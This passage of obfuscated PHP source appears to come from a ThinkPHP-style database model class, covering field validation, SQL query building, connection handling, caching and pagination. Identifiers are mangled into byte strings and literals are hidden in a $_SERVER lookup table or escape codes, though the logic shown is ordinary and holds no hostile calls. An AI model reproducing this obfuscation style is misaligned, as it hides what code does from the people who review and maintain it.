call_user_func_array($ÁÅ«Úİå[1], $”Î€Ûğ¾); } else { $ê·¯É‚Ê[$ÁÅ«Úİå[0]] = call_user_func_array(array(&$this, $ÁÅ«Úİå[1]), $”Î€Ûğ¾); } break; case $Ñ–É€Òú[351]: $ê·¯É‚Ê[$ÁÅ«Úİå[0]] = $ê·¯É‚Ê[$ÁÅ«Úİå[1]]; break; case $Ñ–É€Òú[398]: if ($Ñ–É€Òú[12] === $ê·¯É‚Ê[$ÁÅ«Úİå[0]]) { unset($ê·¯É‚Ê[$ÁÅ«Úİå[0]]); } break; case $Ñ–É€Òú[399]: default: $ê·¯É‚Ê[$ÁÅ«Úİå[0]] = $ÁÅ«Úİå[1]; } if (!1 === $ê·¯É‚Ê[$ÁÅ«Úİå[0]]) { unset($ê·¯É‚Ê[$ÁÅ«Úİå[0]]); } } } } return $ê·¯É‚Ê; } protected function autoValidation($¢Å¡˜Ì, $•ÔğºÌ) { $¥¿ÚÎ =& $_SERVER[¹Éµ„ºå]; if (!empty($this->options[$¥¿ÚÎ[400]])) { $ÆòÂà‘‰ = $this->options[$¥¿ÚÎ[400]]; unset($this->options[$¥¿ÚÎ[400]]); } elseif (!empty($this->_validate)) { $ÆòÂà‘‰ = $this->_validate; } if (isset($ÆòÂà‘‰)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÆòÂà‘‰ as $ÑÑÁŠ˜â => $ÛÅÊí’­) { if (empty($ÛÅÊí’­[5]) || $ÛÅÊí’­[5] == THINK_MODEL_BOTH || $ÛÅÊí’­[5] == $•ÔğºÌ) { if (0 == strpos($ÛÅÊí’­[2], $¥¿ÚÎ[401]) && strpos($ÛÅÊí’­[2], $¥¿ÚÎ[402])) { $ÛÅÊí’­[2] = think_lang(substr($ÛÅÊí’­[2], 2, -1)); } $ÛÅÊí’­[3] = isset($ÛÅÊí’­[3]) ? $ÛÅÊí’­[3] : THINK_EXISTS_VALIDATE; $ÛÅÊí’­[4] = isset($ÛÅÊí’­[4]) ? $ÛÅÊí’­[4] : $¥¿ÚÎ[403]; switch ($ÛÅÊí’­[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¢Å¡˜Ì, $ÛÅÊí’­)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¥¿ÚÎ[12] != trim($¢Å¡˜Ì[$ÛÅÊí’­[0]])) { if (!1 === $this->_validationField($¢Å¡˜Ì, $ÛÅÊí’­)) { return !1; } } break; default: if (isset($¢Å¡˜Ì[$ÛÅÊí’­[0]])) { if (!1 === $this->_validationField($¢Å¡˜Ì, $ÛÅÊí’­)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($âµ§½š¦, $¨‹ì†”À) { if (!1 === $this->_validationFieldItem($âµ§½š¦, $¨‹ì†”À)) { if ($this->patchValidate) { $this->error[$¨‹ì†”À[0]] = $¨‹ì†”À[2]; } else { $this->error = $¨‹ì†”À[2]; return !1; } } return; } protected function _validationFieldItem($¢ÚÏù…, $˜™Øğİ„) { $ŒÓœÇ‚ =& $_SERVER[¹Éµ„ºå]; switch (strtolower(trim($˜™Øğİ„[4]))) { case $ŒÓœÇ‚[396]: case $ŒÓœÇ‚[397]: $µôˆÍ€ñ = isset($˜™Øğİ„[6]) ? (array) $˜™Øğİ„[6] : array(); if (is_string($˜™Øğİ„[0]) && strpos($˜™Øğİ„[0], $ŒÓœÇ‚[50])) { $˜™Øğİ„[0] = explode($ŒÓœÇ‚[50], $˜™Øğİ„[0]); } if (is_array($˜™Øğİ„[0])) { foreach ($˜™Øğİ„[0] as $„ŸÆ­÷“) { $¿™ôÒªä[$„ŸÆ­÷“] = $¢ÚÏù…[$„ŸÆ­÷“]; } array_unshift($µôˆÍ€ñ, $¿™ôÒªä); } else { array_unshift($µôˆÍ€ñ, $¢ÚÏù…[$˜™Øğİ„[0]]); } if ($ŒÓœÇ‚[396] == $˜™Øğİ„[4]) { return call_user_func_array($˜™Øğİ„[1], $µôˆÍ€ñ); } else { return call_user_func_array(array(&$this, $˜™Øğİ„[1]), $µôˆÍ€ñ); } case $ŒÓœÇ‚[404]: return $¢ÚÏù…[$˜™Øğİ„[0]] == $¢ÚÏù…[$˜™Øğİ„[1]]; case $ŒÓœÇ‚[405]: if (is_string($˜™Øğİ„[0]) && strpos($˜™Øğİ„[0], $ŒÓœÇ‚[50])) { $˜™Øğİ„[0] = explode($ŒÓœÇ‚[50], $˜™Øğİ„[0]); } $½ÏÁíªü = array(); if (is_array($˜™Øğİ„[0])) { foreach ($˜™Øğİ„[0] as $„ŸÆ­÷“) { $½ÏÁíªü[$„ŸÆ­÷“] = $¢ÚÏù…[$„ŸÆ­÷“]; } } else { $½ÏÁíªü[$˜™Øğİ„[0]] = $¢ÚÏù…[$˜™Øğİ„[0]]; } if (!empty($¢ÚÏù…[$this->getPk()])) { $½ÏÁíªü[$this->getPk()] = array($ŒÓœÇ‚[406], $¢ÚÏù…[$this->getPk()]); } if ($this->where($½ÏÁíªü)->find()) { return !1; } return !0; default: return $this->check($¢ÚÏù…[$˜™Øğİ„[0]], $˜™Øğİ„[1], $˜™Øğİ„[4]); } } public function check($Á²üË, $¬ÌªîÖ, $‹º•é”à = "\162\145\x67\145\x78") { $¬ÎÓ£Å… =& $_SERVER[¹Éµ„ºå]; $‹º•é”à = strtolower(trim($‹º•é”à)); switch ($‹º•é”à) { case $¬ÎÓ£Å…[7]: case $¬ÎÓ£Å…[407]: $•˜úÇ±¤ = is_array($¬ÌªîÖ) ? $¬ÌªîÖ : explode($¬ÎÓ£Å…[50], $¬ÌªîÖ); return $‹º•é”à == $¬ÎÓ£Å…[7] ? in_array($Á²üË, $•˜úÇ±¤) : !in_array($Á²üË, $•˜úÇ±¤); case $¬ÎÓ£Å…[408]: case $¬ÎÓ£Å…[409]: if (is_array($¬ÌªîÖ)) { $ä›Û€« = $¬ÌªîÖ[0]; $ä­Ü²Šß = $¬ÌªîÖ[1]; } else { list($ä›Û€«, $ä­Ü²Šß) = explode($¬ÎÓ£Å…[50], $¬ÌªîÖ); } return $‹º•é”à == $¬ÎÓ£Å…[408] ? $Á²üË >= $ä›Û€« && $Á²üË <= $ä­Ü²Šß : $Á²üË < $ä›Û€« || $Á²üË > $ä­Ü²Šß; case $¬ÎÓ£Å…[410]: case $¬ÎÓ£Å…[411]: return $‹º•é”à == $¬ÎÓ£Å…[410] ? $Á²üË == $¬ÌªîÖ : $Á²üË != $¬ÌªîÖ; case $¬ÎÓ£Å…[412]: $ •Ş¾ÜÎ = mb_strlen($Á²üË, $¬ÎÓ£Å…[413]); if (strpos($¬ÌªîÖ, $¬ÎÓ£Å…[50])) { list($ä›Û€«, $ä­Ü²Šß) = explode($¬ÎÓ£Å…[50], $¬ÌªîÖ); return $ •Ş¾ÜÎ >= $ä›Û€« && $ •Ş¾ÜÎ <= $ä­Ü²Šß; } else { return $ •Ş¾ÜÎ == $¬ÌªîÖ; } case $¬ÎÓ£Å…[414]: list($®Æôƒ§, $‹¾å¸Û ) = explode($¬ÎÓ£Å…[50], $¬ÌªîÖ); if (!is_numeric($®Æôƒ§)) { $®Æôƒ§ = strtotime($®Æôƒ§); } if (!is_numeric($‹¾å¸Û )) { $‹¾å¸Û  = strtotime($‹¾å¸Û ); } return NOW_TIME >= $®Æôƒ§ && NOW_TIME <= $‹¾å¸Û ; case $¬ÎÓ£Å…[415]: return in_array(get_client_ip(), explode($¬ÎÓ£Å…[50], $¬ÌªîÖ)); case $¬ÎÓ£Å…[416]: return !in_array(get_client_ip(), explode($¬ÎÓ£Å…[50], $¬ÌªîÖ)); case $¬ÎÓ£Å…[403]: default: return $this->regex($Á²üË, $¬ÌªîÖ); } } public function query($Èæ¾ÁŞ®, $¤ì‹…Àœ = false) { $û“ ¡úå =& $_SERVER[¹Éµ„ºå]; if (!is_bool($¤ì‹…Àœ) && !is_array($¤ì‹…Àœ)) { $¤ì‹…Àœ = func_get_args(); array_shift($¤ì‹…Àœ); } $Èæ¾ÁŞ® = str_replace(array($û“ ¡úå[285], $û“ ¡úå[417]), $û“ ¡úå[53], $Èæ¾ÁŞ®); $Èæ¾ÁŞ® = $this->parseSql($Èæ¾ÁŞ®, $¤ì‹…Àœ); return $this->db->query($Èæ¾ÁŞ®); } public function execute($ºğá©÷ş, $çÚ­Úƒá = false) { if (!is_bool($çÚ­Úƒá) && !is_array($çÚ­Úƒá)) { $çÚ­Úƒá = func_get_args(); array_shift($çÚ­Úƒá); } $ºğá©÷ş = $this->parseSql($ºğá©÷ş, $çÚ­Úƒá); return $this->db->execute($ºğá©÷ş); } protected function parseSql($À‡Éº…æ, $±”€áŞ) { $Ò§—¾ã­ =& $_SERVER[¹Éµ„ºå]; if (!0 === $±”€áŞ) { $•Âî©áá = $this->_parseOptions(); $À‡Éº…æ = $this->db->parseSql($À‡Éº…æ, $•Âî©áá); } elseif (is_array($±”€áŞ)) { $±”€áŞ = array_map(array($this->db, $Ò§—¾ã­[418]), $±”€áŞ); $À‡Éº…æ = vsprintf($À‡Éº…æ, $±”€áŞ); } else { $À‡Éº…æ = strtr($À‡Éº…æ, array($Ò§—¾ã­[419] => $this->getTableName(), $Ò§—¾ã­[420] => think_config($Ò§—¾ã­[321]))); } $this->db->setModel($this->name); return $À‡Éº…æ; } public function db($ğ“´áÀø = '', $Îİ¢×ù„ = '', $Â¾¯ÃË = array()) { $Ô¥‰óí =& $_SERVER[¹Éµ„ºå]; if ($Ô¥‰óí[12] === $ğ“´áÀø && $this->db) { return $this->db; } static $Î€óéƒ¸ = array(); static $Ä¶—”£™ = array(); if (!isset($Ä¶—”£™[$ğ“´áÀø]) || isset($Ä¶—”£™[$ğ“´áÀø]) && $Îİ¢×ù„ && $Î€óéƒ¸[$ğ“´áÀø] != $Îİ¢×ù„) { if (!empty($Îİ¢×ù„) && is_string($Îİ¢×ù„) && !1 === strpos($Îİ¢×ù„, $Ô¥‰óí[8])) { $Îİ¢×ù„ = think_config($Îİ¢×ù„); } $ğ“´áÀø = think_guid($Îİ¢×ù„); $Ä¶—”£™[$ğ“´áÀø] = Db::getInstance($Îİ¢×ù„); } elseif (NULL === $Îİ¢×ù„) { $Ä¶—”£™[$ğ“´áÀø]->close(); unset($Ä¶—”£™[$ğ“´áÀø]); return; } if (!empty($Â¾¯ÃË)) { if (is_string($Â¾¯ÃË)) { parse_str($Â¾¯ÃË, $Â¾¯ÃË); } foreach ($Â¾¯ÃË as $ïğÅ½šÖ => $·ûÃŠÈÏ) { $this->setProperty($ïğÅ½šÖ, $·ûÃŠÈÏ); } } $Î€óéƒ¸[$ğ“´áÀø] = $Îİ¢×ù„; $this->db = $Ä¶—”£™[$ğ“´áÀø]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ûÂíßıø = get_class($this); if ($ûÂíßıø == $_SERVER[¹Éµ„ºå][421]) { return $this->name; } $this->name = substr($ûÂíßıø, 0, -5); } return $this->name; } public function getTableName() { $ùÇ¢Ÿê =& $_SERVER[¹Éµ„ºå]; if (empty($this->trueTableName)) { $ÉÈİû‚» = !empty($this->tablePrefix) ? $this->tablePrefix : $ùÇ¢Ÿê[12]; if (!empty($this->tableName)) { $ÉÈİû‚» .= $this->tableName; } else { $ÉÈİû‚» .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÉÈİû‚»); } return (!empty($this->dbName) ? $this->dbName . $ùÇ¢Ÿê[10] : $ùÇ¢Ÿê[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $é©Å÷— =& $_SERVER[¹Éµ„ºå]; return isset($this->fields[$é©Å÷—[328]]) ? $this->fields[$é©Å÷—[328]] : $this->pk; } public function getDbFields() { $äÕÀ®Ëğ =& $_SERVER[¹Éµ„ºå]; if (isset($this->options[$äÕÀ®Ëğ[357]])) { $­¡”§Çî = $this->db->getFields($this->options[$äÕÀ®Ëğ[357]]); return $­¡”§Çî ? array_keys($­¡”§Çî) : !1; } if ($this->fields) { $­¡”§Çî = $this->fields; unset($­¡”§Çî[$äÕÀ®Ëğ[327]], $­¡”§Çî[$äÕÀ®Ëğ[328]], $­¡”§Çî[$äÕÀ®Ëğ[329]], $­¡”§Çî[$äÕÀ®Ëğ[326]]); return $­¡”§Çî; } return !1; } public function data($´‘Ò¶œ° = '') { $³ó¾Ûó¿ =& $_SERVER[¹Éµ„ºå]; if ($³ó¾Ûó¿[12] === $´‘Ò¶œ° && !empty($this->data)) { return $this->data; } if (is_object($´‘Ò¶œ°)) { $´‘Ò¶œ° = get_object_vars($´‘Ò¶œ°); } elseif (is_string($´‘Ò¶œ°)) { parse_str($´‘Ò¶œ°, $´‘Ò¶œ°); } elseif (!is_array($´‘Ò¶œ°)) { think_exception(think_lang($³ó¾Ûó¿[349])); } $this->data = $´‘Ò¶œ°; return $this; } public function join($ˆÒÓ£ïÊ) { $¡¥²ù®É =& $_SERVER[¹Éµ„ºå]; if (is_array($ˆÒÓ£ïÊ)) { $this->options[$¡¥²ù®É[360]] = $ˆÒÓ£ïÊ; } elseif (!empty($ˆÒÓ£ïÊ)) { $this->options[$¡¥²ù®É[360]][] = $ˆÒÓ£ïÊ; } return $this; } public function union($ˆ‰¾Ùı®, $ÈÛ´ö = false) { $ÜìÊæú‹ =& $_SERVER[¹Éµ„ºå]; if (empty($ˆ‰¾Ùı®)) { return $this; } if ($ÈÛ´ö) { $this->options[$ÜìÊæú‹[422]][$ÜìÊæú‹[423]] = !0; } if (is_object($ˆ‰¾Ùı®)) { $ˆ‰¾Ùı® = get_object_vars($ˆ‰¾Ùı®); } if (is_string($ˆ‰¾Ùı®)) { $Ö²İ£˜ƒ = $ˆ‰¾Ùı®; } elseif (is_array($ˆ‰¾Ùı®)) { if (isset($ˆ‰¾Ùı®[0])) { $this->options[$ÜìÊæú‹[422]] = array_merge($this->options[$ÜìÊæú‹[422]], $ˆ‰¾Ùı®); return $this; } else { $Ö²İ£˜ƒ = $ˆ‰¾Ùı®; } } else { think_exception(think_lang($ÜìÊæú‹[349])); } $this->options[$ÜìÊæú‹[422]][] = $Ö²İ£˜ƒ; return $this; } public function cache($°·°Ëå = true, $ú›ÊÌïó = null, $ˆù²¸õ = '') { $Öûç˜Ôº =& $_SERVER[¹Éµ„ºå]; if (!1 !== $°·°Ëå) { $this->options[$Öûç˜Ôº[424]] = array($Öûç˜Ôº[95] => $°·°Ëå, $Öûç˜Ôº[414] => $ú›ÊÌïó, $Öûç˜Ôº[33] => $ˆù²¸õ); } return $this; } public function field($‚ÅşÆ¾£, $¨Õùş‹Ÿ = false) { $¦åÜ³Ï« =& $_SERVER[¹Éµ„ºå]; if (!0 === $‚ÅşÆ¾£) { $½œ–Á‡É = $this->getDbFields(); $‚ÅşÆ¾£ = $½œ–Á‡É ? $½œ–Á‡É : $¦åÜ³Ï«[220]; } elseif ($¨Õùş‹Ÿ) { if (is_string($‚ÅşÆ¾£)) { $‚ÅşÆ¾£ = explode($¦åÜ³Ï«[50], $‚ÅşÆ¾£); } $½œ–Á‡É = $this->getDbFields(); $‚ÅşÆ¾£ = $½œ–Á‡É ? array_diff($½œ–Á‡É, $‚ÅşÆ¾£) : $‚ÅşÆ¾£; } $this->options[$¦åÜ³Ï«[351]] = $‚ÅşÆ¾£; return $this; } public function scope($Áİ÷´¨ = '', $»—ÀÃî¾ = NULL) { $‚í‘¶äë =& $_SERVER[¹Éµ„ºå]; if ($‚í‘¶äë[12] === $Áİ÷´¨) { if (isset($this->_scope[$‚í‘¶äë[37]])) { $ô¼ê›Ûô = $this->_scope[$‚í‘¶äë[37]]; } else { return $this; } } elseif (is_string($Áİ÷´¨)) { $àú”‰‹¹ = explode($‚í‘¶äë[50], $Áİ÷´¨); $ô¼ê›Ûô = array(); foreach ($àú”‰‹¹ as $‡ÜÑêı¢) { if (!isset($this->_scope[$‡ÜÑêı¢])) { continue; } $ô¼ê›Ûô = array_merge($ô¼ê›Ûô, $this->_scope[$‡ÜÑêı¢]); } if (!empty($»—ÀÃî¾) && is_array($»—ÀÃî¾)) { $ô¼ê›Ûô = array_merge($ô¼ê›Ûô, $»—ÀÃî¾); } } elseif (is_array($Áİ÷´¨)) { $ô¼ê›Ûô = $Áİ÷´¨; } if (is_array($ô¼ê›Ûô) && !empty($ô¼ê›Ûô)) { $this->options = array_merge($this->options, array_change_key_case($ô¼ê›Ûô)); } return $this; } public function where($¯û¦æÔŠ, $µ¨êî¡í = null) { $¡¹ß©ˆŸ =& $_SERVER[¹Éµ„ºå]; if (!is_null($µ¨êî¡í) && is_string($¯û¦æÔŠ)) { if (!is_array($µ¨êî¡í)) { $µ¨êî¡í = func_get_args(); array_shift($µ¨êî¡í); } $µ¨êî¡í = array_map(array($this->db, $¡¹ß©ˆŸ[418]), $µ¨êî¡í); $¯û¦æÔŠ = vsprintf($¯û¦æÔŠ, $µ¨êî¡í); } elseif (is_object($¯û¦æÔŠ)) { $¯û¦æÔŠ = get_object_vars($¯û¦æÔŠ); } elseif (is_array($¯û¦æÔŠ)) { foreach ($¯û¦æÔŠ as $ä¶İÇ»Ğ => $ğ ½èè) { if ((is_numeric($ä¶İÇ»Ğ) || !$ä¶İÇ»Ğ) && is_string($ğ ½èè)) { if (strpos($ğ ½èè, $¡¹ß©ˆŸ[425]) === 0) { continue; } think_trace($¡¹ß©ˆŸ[426], $¡¹ß©ˆŸ[12], $¡¹ß©ˆŸ[49]); die; } } } if (is_string($¯û¦æÔŠ) && $¡¹ß©ˆŸ[12] != $¯û¦æÔŠ) { $™Åşïİ = array(); $™Åşïİ[$¡¹ß©ˆŸ[427]] = $¯û¦æÔŠ; $¯û¦æÔŠ = $™Åşïİ; } if (isset($this->options[$¡¹ß©ˆŸ[353]])) { $this->options[$¡¹ß©ˆŸ[353]] = array_merge($this->options[$¡¹ß©ˆŸ[353]], $¯û¦æÔŠ); } else { $this->options[$¡¹ß©ˆŸ[353]] = $¯û¦æÔŠ; } return $this; } public function limit($±¶êÆŒË, $øûã‚ï– = null) { $­ÒŸå…í =& $_SERVER[¹Éµ„ºå]; $this->options[$­ÒŸå…í[368]] = is_null($øûã‚ï–) ? $±¶êÆŒË : $±¶êÆŒË . $­ÒŸå…í[50] . $øûã‚ï–; return $this; } public function page($ÀÆëØ¢Ğ, $®±ıËØÉ = null) { $½›·èû» =& $_SERVER[¹Éµ„ºå]; $this->options[$½›·èû»[428]] = is_null($®±ıËØÉ) ? $ÀÆëØ¢Ğ : $ÀÆëØ¢Ğ . $½›·èû»[50] . $®±ıËØÉ; return $this; } public function comment($ÚĞŸÖç°) { $this->options[$_SERVER[¹Éµ„ºå][429]] = $ÚĞŸÖç°; return $this; } public function setProperty($â¥óşÈ, $Ú¨½ò“¿) { if (property_exists($this, $â¥óşÈ)) { $this->{$â¥óşÈ} = $Ú¨½ò“¿; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\x73\x65\x72\x74\54\165\x70\144\x61\164\145", "\x66\x75\x6e\x63\164\x69\x6f\x6e"), array("\x63\162\145\x61\164\145\124\x69\155\x65", "\x74\151\155\x65", "\x69\x6e\163\x65\x72\x74", "\x66\165\156\143\x74\x69\x6f\x6e")); public function setDataAuto($¼‡«Ô›ì) { $this->dataAuto = $¼‡«Ô›ì; } public function __construct($ˆıÈÌ¹Æ = '', $ãùæ¥”É = '', $™¿»úÊ = '') { parent::__construct($ˆıÈÌ¹Æ, $ãùæ¥”É, $™¿»úÊ); } protected $tableMeta = array(); protected function _beforeInsert(&$û§×½¡¯, $‰ÏšÑÂ) { $£¤èü¢¹ =& $_SERVER[¹Éµ„ºå]; if (!$this->checkDataAutoHas($£¤èü¢¹[430])) { return; } $this->dataBeforeFilter($û§×½¡¯, $£¤èü¢¹[430]); } protected function _beforeUpdate(&$€©¶¹±è, $õÔô˜˜) { $Ì¹§ƒ¤î =& $_SERVER[¹Éµ„ºå]; if (!$this->checkDataAutoHas($Ì¹§ƒ¤î[431])) { return; } $this->dataBeforeFilter($€©¶¹±è, $Ì¹§ƒ¤î[431]); } protected function _afterSelect(&$î•İù, $‡è¢íÏø) { if (!is_array($î•İù)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹Éµ„ºå][432])) { return; } foreach ($î•İù as &$ÄÎœ†•Ğ) { $this->dataAfterFilter($ÄÎœ†•Ğ); } unset($ÄÎœ†•Ğ); } protected function _afterFind(&$ÏÜéş ù, $‡ñ³æÃ¼) { if (!is_array($ÏÜéş ù)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹Éµ„ºå][432])) { return; } $this->dataAfterFilter($ÏÜéş ù); } public static function textEncode($òÚ¢âÖ¾) { if (!$òÚ¢âÖ¾) { return $òÚ¢âÖ¾; } $Ô¥‹‘Ç¬ = json_encode($òÚ¢âÖ¾); $Ô¥‹‘Ç¬ = preg_replace_callback($_SERVER[¹Éµ„ºå][433], function ($—•õšœË) { return addslashes($—•õšœË[0]); }, $Ô¥‹‘Ç¬); return json_decode($Ô¥‹‘Ç¬); } public static function textDecode($©Úø½©Ó) { $âûÉíê“ =& $_SERVER[¹Éµ„ºå]; if (!$©Úø½©Ó) { return $©Úø½©Ó; } $¨Ü™ÊÂÃ = json_encode($©Úø½©Ó); $¨Ü™ÊÂÃ = preg_replace_callback($âûÉíê“[434], function ($ÏÅşù¼Æ) { return $_SERVER[¹Éµ„ºå][97]; }, $¨Ü™ÊÂÃ); return json_decode($¨Ü™ÊÂÃ); } public function setAutoIncrement($Óë°ÏÃ) { $ã÷³¸ = array($this->getPk() => $Óë°ÏÃ); $º‹ùÕŒÈ = $this->data($ã÷³¸)->add(); if ($º‹ùÕŒÈ) { $this->delete($º‹ùÕŒÈ); } } public function getAutoIncrement() { $Àˆƒ‚È = $this->getTableName(); $»àİÜÖ = $this->max($this->getPk()); $¥»­İì = $this->query("\x73\x68\157\x77\40\x74\141\142\x6c\x65\x20\163\164\x61\164\165\163\x20\167\150\145\x72\145\40\116\x61\x6d\x65\x3d\47{$Àˆƒ‚È}\47"); $´ÖŸ”ùÉ = $¥»­İì[0][$_SERVER[¹Éµ„ºå][435]]; $¹±ñ­ü = max($»àİÜÖ, $´ÖŸ”ùÉ); return $¹±ñ­ü; } protected function _callBefore($«€™ãìş, $ø×­Âõ‚) { return $this->cacheCallCheck($«€™ãìş, $ø×­Âõ‚, !1); } protected function _callAfter($íİ”Èõ¯, $…®´ÕÓÕ) { return $this->cacheCallCheck($íİ”Èõ¯, $…®´ÕÓÕ, !0); } protected function cacheFunctionAlias($£çßÕÚÕ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($à ¢¤Á¿, $°€Á˜¤÷, $•Èå¶¤‡ = false) { $†•¡„…Ø =& $_SERVER[¹Éµ„ºå]; $‹ÒŸ¸ò = $this->cacheFunctionAlias($°€Á˜¤÷); if (!$‹ÒŸ¸ò) { return; } foreach ($‹ÒŸ¸ò as $ˆïæƒ°ˆ => $–­ÍÑşß) { $‰È…ÖĞá = $–­ÍÑşß[0]; $ıÀ£¼É = explode($†•¡„…Ø[50], $–­ÍÑşß[1]); $‡²Ğ–¶Ø = isset($–­ÍÑşß[2]) ? $–­ÍÑşß[2] : $†•¡„…Ø[12]; if ($à ¢¤Á¿ == $ˆïæƒ°ˆ) { return $this->cacheFunctionGet($ˆïæƒ°ˆ, $‰È…ÖĞá, $‡²Ğ–¶Ø); } if ($•Èå¶¤‡ && in_array($à ¢¤Á¿, $ıÀ£¼É)) { $this->cacheFunctionClear($ˆïæƒ°ˆ, $‰È…ÖĞá, $‡²Ğ–¶Ø); } } } public function cacheFunctionGet($ãø‹¢”, $šÇÚ£ïÒ, $Š™ú„ì = '') { $¢â£ñ‰÷ =& $_SERVER[¹Éµ„ºå]; $¶‘ğ†•ë = $this->cacheKeyMake($ãø‹¢”, $šÇÚ£ïÒ, $Š™ú„ì); $ñéÇÈŠÚ = Cache::get($¶‘ğ†•ë); if (!is_array($ñéÇÈŠÚ)) { if (method_exists($this, $¢â£ñ‰÷[341] . $ãø‹¢”)) { $ãø‹¢” = $¢â£ñ‰÷[341] . $ãø‹¢”; } $ñéÇÈŠÚ = call_user_func_array(array($this, $ãø‹¢”), array($šÇÚ£ïÒ, !0)); Cache::set($¶‘ğ†•ë, $ñéÇÈŠÚ); } return $ñéÇÈŠÚ; } public function cacheFunctionClear($ô¡æ³îº, $¼Ë‡ê²Û, $«‰“œƒÜ = '') { $Ü¡×î¸¬ = $¼Ë‡ê²Û; if (!is_array($¼Ë‡ê²Û)) { $Ü¡×î¸¬ = array($¼Ë‡ê²Û); } foreach ($Ü¡×î¸¬ as $Ç‡¸¡£é) { $ÉÅÓÆÌ© = $this->cacheKeyMake($ô¡æ³îº, $Ç‡¸¡£é, $«‰“œƒÜ); Cache::remove($ÉÅÓÆÌ©); } } public function cacheKeyMake($æ‹Ûç…, $òÓ’ş¦², $ÍäÖ”¸ì) { $¬ã÷ ’¾ =& $_SERVER[¹Éµ„ºå]; if ($ÍäÖ”¸ì) { $òÓ’ş¦² = $òÓ’ş¦² . $¬ã÷ ’¾[436] . $ÍäÖ”¸ì; } return get_class($this) . $¬ã÷ ’¾[11] . $æ‹Ûç… . $¬ã÷ ’¾[437] . $òÓ’ş¦²; } protected function selectPageReset() { $²Èş”Æş =& $_SERVER[¹Éµ„ºå]; if (isset($GLOBALS[$²Èş”Æş[438]])) { return; } $GLOBALS[$²Èş”Æş[438]] = isset($GLOBALS[$²Èş”Æş[7]][$²Èş”Æş[439]]) ? $GLOBALS[$²Èş”Æş[7]][$²Èş”Æş[439]] : !1; $GLOBALS[$²Èş”Æş[440]] = isset($GLOBALS[$²Èş”Æş[7]][$²Èş”Æş[428]]) ? $GLOBALS[$²Èş”Æş[7]][$²Èş”Æş[428]] : !1; $GLOBALS[$²Èş”Æş[7]][$²Èş”Æş[439]] = !1; $GLOBALS[$²Èş”Æş[7]][$²Èş”Æş[428]] = !1; } protected function selectPageRestore() { $Ğ¶Úˆğ· =& $_SERVER[¹Éµ„ºå]; if (!isset($GLOBALS[$Ğ¶Úˆğ·[438]])) { return; } $GLOBALS[$Ğ¶Úˆğ·[7]][$Ğ¶Úˆğ·[439]] = $GLOBALS[$Ğ¶Úˆğ·[438]]; $GLOBALS[$Ğ¶Úˆğ·[7]][$Ğ¶Úˆğ·[428]] = $GLOBALS[$Ğ¶Úˆğ·[440]]; if ($GLOBALS[$Ğ¶Úˆğ·[7]][$Ğ¶Úˆğ·[439]] === !1) { unset($GLOBALS[$Ğ¶Úˆğ·[7]][$Ğ¶Úˆğ·[439]]); } if ($GLOBALS[$Ğ¶Úˆğ·[7]][$Ğ¶Úˆğ·[428]] === !1) { unset($GLOBALS[$Ğ¶Úˆğ·[7]][$Ğ¶Úˆğ·[428]]); } unset($GLOBALS[$Ğ¶Úˆğ·[438]]); unset($GLOBALS[$Ğ¶Úˆğ·[440]]); } protected function selectPage($˜õæ¢’Ö = 200, $ª”şÑ¹ã = 1) { $¡Æû­òÌ =& $_SERVER[¹Éµ„ºå]; global $in; $Ğ¯ÌÁÇŞ = $this->optionsValue(); $àåë‘à„ = 100000; $˜õæ¢’Ö = isset($in[$¡Æû­òÌ[439]]) && $in[$¡Æû­òÌ[439]] ? $in[$¡Æû­òÌ[439]] : $˜õæ¢’Ö; if ($˜õæ¢’Ö === -1) { $in[$¡Æû­òÌ[439]] = !1; $àåë‘à„ = 100000000; $˜õæ¢’Ö = $àåë‘à„; } $…¿ôºü³ = $Ğ¯ÌÁÇŞ; $…¿ôºü³[$¡Æû­òÌ[441]] = array(); $˜õæ¢’Ö = intval($˜õæ¢’Ö); $˜õæ¢’Ö = $˜õæ¢’Ö <= 5 ? 5 : ($˜õæ¢’Ö >= $àåë‘à„ ? $àåë‘à„ : $˜õæ¢’Ö); $ª”şÑ¹ã = intval(isset($in[$¡Æû­òÌ[428]]) && $in[$¡Æû­òÌ[428]] ? $in[$¡Æû­òÌ[428]] : $ª”şÑ¹ã); $ª”şÑ¹ã = $ª”şÑ¹ã <= 1 ? 1 : $ª”şÑ¹ã; $Ÿ†¨İ­³ = array(); $íú‘ÍÚ = 1; $ıÖõÛÙè = $this->selectPageCountBy(); if ($ª”şÑ¹ã == 1 && $íú‘ÍÚ) { $this->optionsValue($Ğ¯ÌÁÇŞ); $Ÿ†¨İ­³ = $this->page($ª”şÑ¹ã, $˜õæ¢’Ö)->select(); $øˆÈÓùÙ = is_array($Ÿ†¨İ­³) ? count($Ÿ†¨İ­³) : 0; if ($øˆÈÓùÙ < $˜õæ¢’Ö) { $Øù„©™¡ = 1; } else { $this->optionsValue($…¿ôºü³); $øˆÈÓùÙ = intval($this->count($ıÖõÛÙè)); $Øù„©™¡ = ceil($øˆÈÓùÙ / $˜õæ¢’Ö); } } else { $this->optionsValue($…¿ôºü³); $øˆÈÓùÙ = intval($this->count($ıÖõÛÙè)); $Øù„©™¡ = ceil($øˆÈÓùÙ / $˜õæ¢’Ö); $ª”şÑ¹ã = $ª”şÑ¹ã >= $Øù„©™¡ ? $Øù„©™¡ : $ª”şÑ¹ã; $this->optionsValue($Ğ¯ÌÁÇŞ); $Ÿ†¨İ­³ = $this->page($ª”şÑ¹ã, $˜õæ¢’Ö)->select(); } 